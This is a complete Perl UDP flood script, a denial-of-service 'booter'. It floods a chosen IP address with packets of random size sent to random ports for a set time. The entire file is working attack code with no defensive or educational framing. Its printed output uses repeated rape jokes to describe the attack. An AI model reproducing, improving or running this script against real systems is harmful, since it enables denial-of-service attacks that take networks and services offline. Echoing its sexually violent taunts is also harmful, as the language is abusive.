#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
 

##
# Ran By Ninja AKA Mr. Psychotik-Booter
##

use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
print BOLD BLUE<<EOTEXT;
888b. 888b.       .d88b.    88888 8   8 8888    .d88b. 8  dP 888 888b. .d88b. 
8   8 8   8 .d8b. YPwww.      8   8www8 8www    YPwww. 8wdP   8  8   8 YPwww. 
8   8 8   8 8' .8     d8      8   8   8 8           d8 88Yb   8  8   8     d8 
888P' 888P' `Y8P' `Y88P'      8   8   8 8888    `Y88P' 8  Yb 888 888P' `Y88P' 

EOTEXT

print BOLD GREEN<<EOTEXT;
Coded By Psychotik-Booter AKA Your DADDY
EOTEXT

print "Sending packets to The Skids $ip " . ($port ? $port : "random") . "
Getting Raped by TheAlmighty " .
  ($size ? "$size byte's" : "Error..") . "
INTENSE RAPE " .
  ($time ? " for $time seconds" : "") . "\n";

print BOLD WHITE<<EOTEXT;
"STOP THE BRUTAL RAPING! with CTRL-C" unless it has been $time seconds;
EOTEXT

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
  